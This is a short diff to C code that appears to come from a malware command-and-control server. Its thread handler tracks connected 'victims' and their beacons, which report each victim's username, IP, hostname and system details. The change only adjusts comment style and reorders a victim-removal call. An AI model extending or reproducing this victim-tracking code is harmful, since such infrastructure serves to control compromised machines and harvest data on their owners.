@@ -133,7 +133,7 @@ void *net_t_client(void *args){
     }
     pthread_mutex_lock(&NET_PTHREAD_MUTEX);
     net_update_victims(p_net_client_beacon, p_victims);
-    //printf("[+] victims: %d\n", NET_VICTIMS_TOTAL);
+    /* printf("[+] victims: %d\n", NET_VICTIMS_TOTAL); */
     /* printf("[+] CONNECT user:%s@%s, hostname:%s, arch:%s, release:%s, load:%d\n", */
     /*        p_net_client_beacon->sysinfo.username, */
     /*        p_net_client_beacon->sysinfo.ip, */
@@ -150,6 +150,7 @@ void *net_t_client(void *args){
     }
   }
   pthread_mutex_lock(&NET_PTHREAD_MUTEX);
+  net_remove_victims(p_net_client_beacon, p_victims);
   /* printf("[+] victims %d\n", NET_VICTIMS_TOTAL); */
   /* printf("[+] DISCONNECT user:%s@%s, hostname:%s, arch:%s, release:%s, load:%d\n", */
   /*        p_net_client_beacon->sysinfo.username, */
@@ -158,7 +159,6 @@ void *net_t_client(void *args){
   /*        p_net_client_beacon->sysinfo.arch, */
   /*        p_net_client_beacon->sysinfo.release, */
   /*        p_net_client_beacon->sysinfo.cpu_usage); */
-  net_remove_victims(p_net_client_beacon, p_victims);
   pthread_mutex_unlock(&NET_PTHREAD_MUTEX);
   pthread_exit(NULL);
 }
